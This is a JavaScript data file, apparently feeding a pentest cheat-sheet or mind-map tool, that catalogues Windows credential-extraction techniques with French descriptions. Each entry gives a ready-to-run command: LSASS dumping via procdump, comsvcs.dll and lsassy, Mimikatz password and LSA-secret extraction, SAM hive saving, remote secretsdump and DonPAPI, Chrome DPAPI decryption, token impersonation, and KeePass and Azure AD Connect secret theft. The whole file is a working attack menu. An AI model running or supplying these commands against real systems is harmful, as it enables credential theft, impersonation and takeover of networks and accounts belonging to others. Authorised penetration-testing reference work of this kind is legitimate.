export const ADMIN_ACCESS_DATA = [
  {
    name: 'Extract from LSASS (Memory)',
    nodes: [
      { 
        label: 'Procdump (Microsoft)', 
        cmd: 'procdump.exe -ma lsass.exe lsass.dmp', 
        leadsTo: 'LSASS Dump',
        description: 'Utilise l\'outil officiel Sysinternals pour dumper la mémoire du processus LSASS (nécessite d\'être Admin/SYSTEM).'
      },
      { 
        label: 'Comsvcs (LoLBin)', 
        cmd: 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full', 
        leadsTo: 'LSASS Dump',
        description: 'Technique "Living off the Land" utilisant une DLL système pour dumper LSASS sans outil tiers.'
      },
      { 
        label: 'Mimikatz (Live)', 
        cmd: 'mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"', 
        leadsTo: 'Cleartext / NTLM',
        description: 'Extrait directement les mots de passe en clair (Wdigest, SSP) et les hashs NTLM de la mémoire active.'
      },
      { 
        label: 'Lsassy (Remote)', 
        cmd: 'lsassy -d <domain> -u <user> -p <password> <target_ip>', 
        leadsTo: 'Cleartext / NTLM',
        description: 'Outil furtif pour dumper LSASS à distance via WMI/SMB et extraire les crédentiels automatiquement.'
      }
    ]
  },
  {
    name: 'Extract from SAM & LSA (Registry)',
    nodes: [
      { 
        label: 'Reg Save Hives', 
        cmd: 'reg save HKLM\\SAM sam & reg save HKLM\\SYSTEM system & reg save HKLM\\SECURITY security', 
        leadsTo: 'Hive Files',
        description: 'Sauvegarde manuelle des ruches de registre contenant les hashs locaux et les secrets LSA pour extraction offline.'
      },
      { 
        label: 'Secretsdump (Remote)', 
        cmd: 'secretsdump.py <domain>/<user>:<password>@<target_ip>', 
        leadsTo: 'Local Hash / LSA',
        description: 'Dump les hashs SAM, les secrets LSA (tâches planifiées, services) et les hashs cached (DCC2) à distance.'
      },
      { 
        label: 'Mimikatz LSA', 
        cmd: 'mimikatz "privilege::debug" "lsadump::secrets" "exit"', 
        leadsTo: 'LSA Secrets',
        description: 'Extrait les secrets LSA stockés par le système (ex: mot de passe du compte machine, SC, DPAPI MasterKeys).'
      }
    ]
  },
  {
    name: 'DPAPI & Browsers',
    nodes: [
      { 
        label: 'Mimikatz Chrome', 
        cmd: 'mimikatz "privilege::debug" "dpapi::chrome /in:\"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\"" "exit"', 
        leadsTo: 'Browser Creds',
        description: 'Déchiffre les mots de passe et cookies stockés dans Chrome en utilisant la MasterKey DPAPI de l\'utilisateur.'
      },
      { 
        label: 'DonPAPI (Remote)', 
        cmd: 'donpapi.py <domain>/<user>:<password>@<target_ip>', 
        leadsTo: 'Wifi / RDP / Browser',
        description: 'Outil complet pour extraire automatiquement les secrets DPAPI (Wifi, RDP, VNC, Navigateurs) à distance.'
      }
    ]
  },
  {
    name: 'Impersonation (Token Theft)',
    nodes: [
      { 
        label: 'Mimikatz Token', 
        cmd: 'mimikatz "privilege::debug" "token::list" "token::elevate" "token::impersonate /user:<target_user>"', 
        leadsTo: 'User Session',
        description: 'Liste et vole le jeton (token) d\'un utilisateur connecté ou d\'un processus pour usurper son identité sans mot de passe.'
      },
      { 
        label: 'Incognito (Metasploit)', 
        cmd: 'load incognito; list_tokens -u; impersonate_token "<DOMAIN>\\<USER>"', 
        leadsTo: 'User Session',
        description: 'Module Metasploit classique pour l\'énumération et le vol de tokens d\'accès.'
      }
    ]
  },
  {
    name: 'Misc (KeePass, Azure)',
    nodes: [
      { 
        label: 'KeeThief (KeePass)', 
        cmd: 'Get-KeePassDatabaseKey', 
        leadsTo: 'Master Key / Pwd',
        description: 'PowerShell pour extraire la clé principale (Master Key) de KeePass directement depuis la mémoire du processus.'
      },
      { 
        label: 'ADConnect Password', 
        cmd: 'AdConnectDump.exe', 
        leadsTo: 'MSOL Account',
        description: 'Extrait le mot de passe du compte de synchronisation AD (MSOL_xxxx) utilisé par Azure AD Connect (souvent Admin Global).'
      }
    ]
  }
];